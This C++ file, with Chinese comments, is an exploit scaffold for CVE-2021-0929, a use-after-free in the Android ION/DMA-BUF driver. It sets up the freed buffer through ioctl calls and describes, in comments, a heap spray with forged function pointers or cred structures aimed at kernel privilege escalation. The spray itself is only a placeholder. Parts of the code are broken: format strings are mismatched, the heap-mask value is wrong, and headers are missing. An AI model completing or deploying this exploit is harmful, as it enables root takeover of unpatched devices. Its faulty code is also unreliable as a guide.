// cve_2021_0929_backend.cpp (概念框架)
#include <chrono>
#include <fcntl.h>
#include <format>
#include <iostream>
#include <linux/dma-buf.h>
#include <linux/ion.h>
#include <string>
#include <sys/ioctl.h>
#include <unistd.h>

void log(const std::string& msg)
{
    auto now = std::chrono::zoned_time { std::chrono::current_zone(), std::chrono::system_clock::now() };
    std::cout << std::format("[{:%Y-%m-%dT%H:%M:%S%z}] [DEBUG] %s\n", now, msg);
}

class CVE20210929Backend {
public:
    bool setup()
    {
        // 1. 打开 ION 设备
        ion_fd_ = open("/dev/ion", O_RDONLY);
        if (ion_fd_ < 0)
            return false;

        // 2. 分配 ION 缓冲区
        struct ion_allocation_data alloc_data = {
            .len = 0x1000,
            .align = 0x1000,
            .heap_id_mask = ION_HEAP_TYPE_SYSTEM,
            .flags = 0,
        };
        if (ioctl(ion_fd_, ION_IOC_ALLOC, &alloc_data) < 0)
            return false;
        handle_ = alloc_data.handle;

        // 3. 导出为 DMA-BUF fd
        struct ion_fd_data fd_data = { .handle = handle_ };
        if (ioctl(ion_fd_, ION_IOC_SHARE, &fd_data) < 0)
            return false;
        dma_buf_fd_ = fd_data.fd;
        return true;
    }

    bool trigger()
    {
        // 关键步骤：制造 UAF
        // 4. 通过 DMA_BUF_IOCTL_SYNC 触发 end_cpu_access，导致内部 kunmap
        struct dma_buf_sync sync_end = { .flags = DMA_BUF_SYNC_END };
        if (ioctl(dma_buf_fd_, DMA_BUF_IOCTL_SYNC, &sync_end) < 0) {
            // 在某些内核上，如果计数器未归零，此操作可能失败
            // 但漏洞场景下，这正是悬空指针产生的位置
        }

        // 5. (可选) 释放 ion handle，进一步触发清理，但保持 dma_buf_fd 打开
        // ioctl(ion_fd_, ION_IOC_FREE, &alloc_data);

        // 此时，底层 buffer 可能已被解映射，但其他内核驱动仍持有引用
        return true;
    }

    // 此函数负责在 UAF 窗口期进行 Heap Spray
    bool reclaim_and_escalate()
    {
        // Heap Spray 策略：
        // 1. 使用 sendmsg/msgsnd 等系统调用，在已释放的内存地址上
        //    喷射精心构造的数据（例如伪造的函数指针、cred 结构体等）。
        // 2. 触发一个对已污染对象的操作，实现控制流劫持或数据篡改。

        // 示例：喷射大量“A”到可能的 UAF 地址
        const size_t spray_size = 0x10000;
        char* spray_buf = (char*)malloc(spray_size);
        log(std::format("Perform example exploit with HeapSpary, output %d bytes to %p.\n", spray_size, spray_buf));
        memset(spray_buf, 0x41, spray_size);
        // 通过某种内核接口（如 msg_msg）喷射数据...
        return true;
    }

    void cleanup()
    {
        if (dma_buf_fd_ > 0)
            close(dma_buf_fd_);
        if (ion_fd_ > 0) {
            // struct ion_handle_data free_data = { .handle = handle_ };
            // ioctl(ion_fd_, ION_IOC_FREE, &free_data);
            close(ion_fd_);
        }
    }

private:
    int ion_fd_ = -1;
    int dma_buf_fd_ = -1;
    ion_user_handle_t handle_ = 0;
};
